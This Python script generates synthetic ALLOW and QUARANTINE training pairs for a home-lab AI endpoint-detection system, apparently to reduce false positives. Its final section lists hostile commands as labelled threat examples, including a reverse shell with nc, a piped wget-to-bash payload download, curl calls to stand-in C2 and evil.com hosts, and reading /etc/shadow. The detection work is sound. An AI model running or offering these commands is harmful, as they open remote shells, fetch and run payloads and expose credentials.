#!/usr/bin/env python3
"""
jeTT Round 3 ALLOW Dataset Generator
Generates balanced ALLOW training pairs for GowskiNet processes
to fix the false positive problem in Guard mode.
"""

import json
import random
from pathlib import Path

OUTPUT_FILE = Path.home() / "Projects/jeTT/jett_allow_training.json"

training_data = []

def add(inp, out):
    training_data.append({"input": inp.strip(), "output": out.strip()})

# ─────────────────────────────────────────────
# GowskiNet trusted processes
# ─────────────────────────────────────────────
trusted_processes = [
    ("bifrost", "Bifrost EDR", "Joseph's custom AI endpoint detection and response system"),
    ("ollama", "Ollama", "local AI inference server serving security models"),
    ("docker", "Docker", "container runtime managing the GowskiNet honeypot stack"),
    ("cowrie", "Cowrie", "SSH/Telnet honeypot capturing attacker sessions"),
    ("prometheus", "Prometheus", "metrics collection for GowskiNet monitoring"),
    ("grafana", "Grafana", "security dashboard displaying honeypot and network metrics"),
    ("loki", "Loki", "log aggregation for GowskiNet security events"),
    ("promtail", "Promtail", "log shipper sending honeypot logs to Loki"),
    ("portainer", "Portainer", "Docker management UI for GowskiNet containers"),
    ("mosquitto", "Mosquitto", "MQTT broker for GowskiNet IoT sensor network"),
    ("cosmic-comp", "cosmic-comp", "NyXxOS Wayland compositor window manager"),
    ("cargo", "Cargo", "Rust build system compiling jeTT and GowskiNet tools"),
    ("rclone", "rclone", "backup sync tool for GowskiNet data to remote storage"),
    ("meshtastic", "Meshtastic", "LoRa mesh radio client for off-grid communications"),
    ("gni_server", "GNI", "GowskiNet Intelligence skull AI server on port 6969"),
    ("systemd", "systemd", "Linux init system managing all GowskiNet services"),
    ("sshd", "sshd", "SSH daemon for authorized remote access to GowskiNet"),
    ("python3", "Python3", "scripting runtime for GowskiNet automation and tools"),
    ("node", "Node.js", "JavaScript runtime for GowskiNet web interfaces"),
    ("pacman", "pacman", "Arch Linux package manager for system updates"),
    ("yay", "yay", "AUR helper for installing security tools on NyXxOS"),
    ("jett", "jeTT", "the AI cybersecurity engine itself — always trusted"),
    ("ghost-relay", "ghost-relay", "Joseph's custom C2 framework for security research"),
    ("ffmpeg", "ffmpeg", "media processing for GowskiNet camera feeds"),
    ("gowskinet-screensaver", "GowskiNet screensaver", "custom pixel art screensaver script"),
    ("daily_report", "daily_report.sh", "scheduled honeypot report generation script"),
    ("nyx-security-center", "NyX Security Center", "NyXxOS security dashboard application"),
    ("flipper", "Flipper Zero", "hardware security research device connected via USB"),
    ("bambu", "Bambu", "3D printer slicer and control software"),
    ("wireguard", "WireGuard", "VPN tunnel for secure GowskiNet remote access"),
]

uids = [1000]
pids = list(range(100, 9999, 7))
times = ["08:00", "09:15", "10:30", "11:45", "13:00", "14:20", "15:45", "16:00", "17:30", "18:00", "20:00", "22:00", "23:00"]
parents = ["systemd", "cosmic-comp", "bash", "zsh", "tmux", "screen"]

print("[*] Generating ALLOW training pairs...")

# Generate variations for each trusted process
for proc_name, display_name, description in trusted_processes:
    for i in range(200):  # 200 variations per process
        pid = random.choice(pids)
        uid = random.choice(uids)
        time = random.choice(times)
        parent = random.choice(parents)
        port = random.randint(1000, 65000)

        # Variation 1: Standard startup
        add(
            f"{proc_name} PID:{pid} started by {parent} uid:{uid} time:{time} normal startup sequence",
            f"ALLOW — {display_name} is a trusted GowskiNet process. {description}."
        )

        # Variation 2: With port
        add(
            f"{proc_name} PID:{pid} uid:{uid} listening on port {port} started by systemd time:{time}",
            f"ALLOW — {display_name} is authorized GowskiNet infrastructure. {description}."
        )

        # Variation 3: Guard mode style
        add(
            f"Process event: {proc_name} PID:{pid} spawned by {parent} uid:{uid} at {time}. jeTT verdict?",
            f"ALLOW — {proc_name} is on the GowskiNet trusted process list. {description}."
        )

        # Variation 4: Running normally
        add(
            f"{proc_name} PID:{pid} cpu:0.{random.randint(1,9)}% mem:{random.randint(10,500)}MB uid:{uid} uptime:{random.randint(1,999)}s",
            f"ALLOW — {display_name} running normally on GowskiNet. {description}."
        )

        # Variation 5: File access
        add(
            f"{proc_name} PID:{pid} uid:{uid} reading config files and initializing at {time}",
            f"ALLOW — {display_name} initialization is expected behavior on GowskiNet. {description}."
        )

# ─────────────────────────────────────────────
# Docker container events — always ALLOW
# ─────────────────────────────────────────────
containers = [
    "cowrie", "heralding", "dionaea", "grafana", "prometheus",
    "loki", "portainer", "nginx", "glastopf", "mailoney"
]

for container in containers:
    for i in range(50):
        pid = random.choice(pids)
        add(
            f"docker container {container} PID:{pid} uid:root started by systemd normal operation",
            f"ALLOW — Docker container '{container}' is part of the GowskiNet honeypot stack. Expected behavior."
        )
        add(
            f"dockerd spawning {container} container PID:{pid} from docker-compose honeypot stack",
            f"ALLOW — '{container}' is an authorized GowskiNet container. Part of the security monitoring infrastructure."
        )

# ─────────────────────────────────────────────
# Development activities — ALLOW
# ─────────────────────────────────────────────
dev_activities = [
    ("cargo build --release", "Rust compilation of GowskiNet tools"),
    ("cargo test", "running unit tests on GowskiNet Rust projects"),
    ("git clone", "cloning security research repositories"),
    ("git pull", "updating GowskiNet tool repositories"),
    ("pip install", "installing Python security tool dependencies"),
    ("npm install", "installing Node.js dependencies for GowskiNet web UI"),
    ("makepkg", "building AUR packages on NyXxOS"),
    ("gcc", "compiling C security research tools"),
    ("rustc", "compiling Rust security tools directly"),
    ("python3 train", "running jeTT AI training scripts"),
    ("cmake", "building security tool dependencies"),
]

for activity, desc in dev_activities:
    for i in range(100):
        pid = random.choice(pids)
        uid = 1000
        add(
            f"{activity} PID:{pid} uid:{uid} started from /home/cosmic/Projects/ time:{random.choice(times)}",
            f"ALLOW — {desc} is normal GowskiNet development activity by Joseph (uid:1000)."
        )

# ─────────────────────────────────────────────
# Network monitoring — ALLOW
# ─────────────────────────────────────────────
network_events = [
    ("192.168.0.172", "MSI GS77 primary workstation"),
    ("192.168.0.125", "Pi Zero W2 Cowrie honeypot"),
    ("192.168.0.100", "Lenovo VM"),
    ("192.168.0.144", "K12 tablet running JuJu's World app"),
    ("192.168.0.80", "Raspberry Pi 5 Kali node"),
    ("192.168.0.1", "TP-Link BE3600 router"),
    ("127.0.0.1", "localhost loopback"),
    ("172.19.0.1", "Docker gateway"),
]

for ip, desc in network_events:
    for i in range(30):
        add(
            f"outbound connection to {ip} port {random.randint(1000, 65000)} from PID:{random.choice(pids)} uid:1000",
            f"ALLOW — {ip} is {desc} on GowskiNet internal network. Trusted internal communication."
        )
        add(
            f"inbound connection from {ip} to local service PID:{random.choice(pids)}",
            f"ALLOW — {ip} is {desc}. Internal GowskiNet traffic is trusted."
        )

# ─────────────────────────────────────────────
# Honeypot attacker events — QUARANTINE
# (Adding more QUARANTINE to keep balance realistic)
# ─────────────────────────────────────────────
threat_events = [
    ("python3 executed from /tmp/.hidden", "executing hidden script from /tmp"),
    ("wget http://185.220.x.x/payload.sh | bash", "downloading and executing remote payload"),
    ("chmod +x /tmp/miner && /tmp/miner", "executing cryptominer from /tmp"),
    ("curl http://c2.darknet.onion/implant -o /tmp/.x", "downloading C2 implant"),
    ("nc -e /bin/bash 185.220.x.x 4444", "reverse shell to external IP"),
    ("cat /etc/shadow", "reading password hashes"),
    ("ld_preload=/tmp/hook.so ls", "LD_PRELOAD injection attack"),
    ("ptrace ATTACH pid:1", "process injection via ptrace"),
    ("memfd_create anon_exec", "fileless execution via memfd"),
    ("crontab -l | curl http://evil.com", "cron-based persistence"),
    ("ssh-keygen && cat >> authorized_keys", "SSH key persistence"),
    ("insmod /tmp/rootkit.ko", "loading malicious kernel module"),
    ("dd if=/dev/mem", "reading raw memory"),
    ("nmap -sS 192.168.0.0/24", "internal network scan from unknown process"),
]

for event, desc in threat_events:
    for i in range(150):
        pid = random.choice(pids)
        add(
            f"{event} PID:{pid} uid:{random.randint(0, 999)} time:{random.choice(times)}",
            f"QUARANTINE — {desc} is a confirmed threat indicator. Isolate PID:{pid} immediately."
        )

print(f"[+] Generated {len(training_data)} training pairs")
print(f"    ALLOW-focused pairs: ~{len([x for x in training_data if 'ALLOW' in x['output']])}")
print(f"    QUARANTINE pairs: ~{len([x for x in training_data if 'QUARANTINE' in x['output']])}")

print(f"[*] Saving to {OUTPUT_FILE}...")
with open(OUTPUT_FILE, 'w') as f:
    json.dump(training_data, f)
print(f"[+] DONE — ready to merge into Round 3 dataset!")
